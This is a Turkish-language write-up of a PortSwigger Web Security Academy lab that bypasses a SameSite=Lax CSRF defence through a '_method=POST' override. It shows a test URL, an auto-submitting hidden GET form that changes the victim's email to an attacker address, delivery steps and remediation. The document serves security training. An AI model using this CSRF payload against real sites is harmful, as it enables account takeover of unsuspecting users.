# SameSite Lax Bypass via Method Override — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-11

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** Orta (Practitioner)
- **Tespit Edilen Zafiyet:** CSRF — SameSite=Lax savunması, HTTP method override (`_method`) ile atlatılıyor
- **Genel Etki:** Saldırgan, GET + `_method=POST` ile SameSite=Lax'ı atlayıp kurbanın e-postasını değiştirebilir
- **Durum:** Tamamlandı — GET form (top-level navigation) + `_method=POST` exploit'i teslim edildi, lab çözüldü

---

## Reconnaissance & Enumeration

Change-email isteği:
```
POST /my-account/change-email
email=test@test.com
```
- **CSRF token YOK** (body'de sadece `email`). Savunma token değil.
- Session cookie'sinde **açık SameSite attribute yok** → tarayıcı (Chrome) **Lax** sayar (default). Savunma bu: SameSite=Lax.

> Not: SameSite, request'in `Cookie:` header'ında görünmez; Set-Cookie'de (login response) belirlenir. "SameSite yazmıyor" = korumasız değil, Lax default demek.

---

## Vulnerability Analysis

- **Savunma:** SameSite=Lax (default). Cross-site POST'a cookie gönderilmez → klasik CSRF (cross-site POST form) başarısız olur.
- **Lax'ın açığı:** Top-level **GET** navigation'a cookie **gönderilir.**
- **Çıkmaz:** İşlem POST gerektiriyor, ama POST cross-site'ta cookie almıyor.
- **Zafiyet:** Framework **method override** (`_method` parametresi) destekliyor. İstek GET ile gelse bile, `_method=POST` varsa framework onu POST olarak işler.
- **Sonuç:** GET (Lax cookie'yi gönderir) + `_method=POST` (framework POST işler) = SameSite=Lax atlatılır.

### İki katman mantığı
| Katman | Gördüğü metot | Sonuç |
|---|---|---|
| SameSite kontrolü (cookie gönderimi) | GET (gerçek) → top-level navigation | cookie gönderilir ✅ |
| İş mantığı (routing) | POST (`_method`) | change-email işlenir ✅ |

---

## Exploitation

### 1. Override doğrulaması
Tarayıcı adres çubuğunda (top-level GET navigation):
```
https://<lab-id>.web-security-academy.net/my-account/change-email?email=test1@test.com&_method=POST
```
→ e-posta değişti → method override çalışıyor.

### 2. Exploit (top-level GET navigation)

```html
<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="_method" value="POST">
</form>
<script>document.forms[0].submit();</script>
```

Akış:
1. Kurban exploit sayfasını açar → script formu otomatik submit eder
2. Form `method="GET"` olduğu için → **top-level GET navigation** → SameSite=Lax session cookie'sini **gönderir**
3. `_method=POST` → framework isteği POST olarak işler → change-email çalışır → kurbanın e-postası değişir

### 3. Teslimat
Exploit server → Store → View exploit (test) → Deliver to victim → lab çözüldü.

---

## Remediation

- **SameSite=Strict** kullan (Lax'ın top-level GET açığını kapatır) — ama Strict'in de subdomain/gadget bypass'ları var, tek savunma olmamalı.
- **CSRF token** ekle (defense in depth) — SameSite atlatılsa bile token'a takılır.
- **Method override'ı kısıtla:** `_method` gibi parametreler sadece güvenli bağlamlarda, ve state-değiştiren işlemlerde gerçek HTTP metoduyla tutarlı olmalı.
- State-değiştiren işlemleri GET üzerinden (override ile bile) kabul etme.

---

## Gotchas (Dikkat Edilecekler)

- **Bu lab'da token YOK** — savunma SameSite=Lax. Token arama; başka fonksiyonda da yok. (Change-email body'sinde `csrf` olmaması normal.)
- **"neden GET?" = SameSite, token değil.** Form POST olsaydı cross-site POST olur, Lax cookie'yi GÖNDERMEZDİ → başarısız. GET top-level navigation olduğu için Lax cookie'yi gönderir. (Mantığı token'a bağlamak yanlış — token yok.)
- **`<img>` OLMAZ.** img subresource'tur, top-level navigation değil → Lax cookie vermez. Top-level navigation şart: GET form auto-submit ya da `document.location`.
- **Top-level navigation ≠ tıklama.** Script (`document.location` / form auto-submit) tıklama olmadan top-level navigation yaratır; Lax yine cookie verir.
- **SameSite default:** Açık attribute yoksa Chrome Lax sayar. Firefox tarihsel olarak uygulamadı → test Chrome/Burp browser ile.
- **URL yapısı:** query string `?` ile başlar, `&` ile eklenir. `?` yoksa `&_method=POST` path sanılır → 404.
- **HTTP/2 Repeater düzenlemesi:** Elle GET'e çevirirken `Connection: keep-alive` gibi yasak header'lar/Content-Length uyuşmazlığı "response yok"a yol açar. "Change request method" kullan ya da tarayıcıda test et (zaten top-level GET senaryosu).
- **Syntax:** input `value` tırnağını kapat, `type="hidden"` değerini ver, form `method="GET"` (POST değil!).

---

## Bağlantı — iki kavramın birleşimi

Bu lab, iki ayrı kavramı zincirliyor:
1. **SameSite=Lax açığı** (top-level GET navigation'a cookie verir)
2. **Method override** (GET isteğini POST olarak işletir)

Tek başına hiçbiri yeterli değil: Lax açığı GET gerektirir ama işlem POST ister; method override bu çelişkiyi çözer. Gerçek pentest'te zafiyetler böyle zincirlenir.
